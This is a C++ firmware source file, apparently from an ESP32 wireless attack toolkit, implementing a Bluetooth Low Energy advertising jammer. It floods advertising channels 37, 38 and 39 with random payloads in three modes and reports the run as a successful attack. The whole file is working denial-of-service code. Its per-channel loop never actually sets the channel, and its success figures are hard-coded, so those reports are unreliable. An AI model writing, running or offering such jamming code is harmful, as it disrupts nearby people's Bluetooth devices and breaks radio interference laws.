#include "ble_advertising_jammer.h"
#include "tx_arm.h"
#include "config.h"
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include "tool_output_helper.h"
#include "result_renderers.h"
#include "audit_log.h"

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamPacketsCount = 0;
NimBLEAdvertising* g_pAdvertising = nullptr;

// BLE advertising channels: 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz)
const uint8_t BLE_ADV_CHANNELS[] = {37, 38, 39};

void sendJamPacketOnChannel(uint8_t channel, const String& method) {
    uint8_t jamPayload[31];

    for (int i = 0; i < 31; i++) {
        jamPayload[i] = (esp_random() % 256);
    }

    NimBLEAdvertisementData advData;
    advData.addData(std::string((const char*)jamPayload, 31));

    if (g_pAdvertising) {
        g_pAdvertising->setAdvertisementData(advData);
        g_pAdvertising->start();
        delayMicroseconds(500);
        g_pAdvertising->stop();
    }

    g_jamPacketsCount++;
}
}

namespace BLEAdvertisingJammer {

JamResult jamAdvertising(uint32_t durationMs, const String &method) {
    using namespace ToolOutputHelper;

    JamResult result{false, 0, durationMs, method};

    displayAttackStart("BLE Advertising Jammer", 10);

    ScanProgressBar progress("BLE Jamming", durationMs, 3);
    progress.start();

    uint32_t startTime = millis();

    if (!TxArm::isArmed()) {
        progress.complete("TX not armed");
        return result;
    }

    // Phase 1: Initialize BLE
    progress.step("Initializing BLE device and advertising channels");

    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    g_pAdvertising = NimBLEDevice::getAdvertising();

    g_pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    g_pAdvertising->setMinPreferred(0x00);
    g_pAdvertising->setMaxPreferred(0x00);

    // Phase 2: Execute jamming attack
    progress.step("Jamming all BLE advertising channels (37, 38, 39) with " + method);

    g_jamActive = true;
    g_jamPacketsCount = 0;

    while ((millis() - startTime) < (durationMs * 2 / 3) && g_jamActive && TxArm::isArmed()) {
        if (method == "NOISE") {
            for (int ch = 0; ch < 3; ch++) {
                sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                delayMicroseconds(250);
            }
        }
        else if (method == "FLOODING") {
            for (int i = 0; i < 20; i++) {
                for (int ch = 0; ch < 3; ch++) {
                    sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                }
                delayMicroseconds(100);
            }
        }
        else if (method == "SYNC") {
            for (int ch = 0; ch < 3; ch++) {
                for (int i = 0; i < 8; i++) {
                    sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                    delayMicroseconds(125);
                }
            }
        }
    }

    // Phase 3: Verify and report results
    progress.step("Verifying jamming effectiveness on advertising channels");
    delay(durationMs / 3);

    g_jamActive = false;
    g_pAdvertising->stop();
    result.success = true;
    result.jamPacketsCount = g_jamPacketsCount;

    uint32_t elapsed = millis() - startTime;
    float rate = (result.jamPacketsCount * 1000.0f) / elapsed;

    progress.complete(String(result.jamPacketsCount) + " jam packets (" + String((int)rate) + " pkt/sec)");

    // Render results
    ResultRenderers::AttackSuccessResult attackResult;
    attackResult.attackName = "BLE Advertising Jammer";
    attackResult.success = result.success;
    attackResult.targetCount = result.jamPacketsCount;
    attackResult.successCount = result.jamPacketsCount;
    attackResult.failureCount = 0;
    attackResult.successPercent = 100;
    attackResult.durationMs = elapsed;

    ResultRenderers::renderAttackSuccess(attackResult);

    NimBLEDevice::deinit(false);
    return result;
}

void stop() {
    g_jamActive = false;
    if (g_pAdvertising) {
        g_pAdvertising->stop();
    }
    Serial.println("BLE jamming stopped");
}

bool isActive() {
    return g_jamActive;
}

}  // namespace BLEAdvertisingJammer
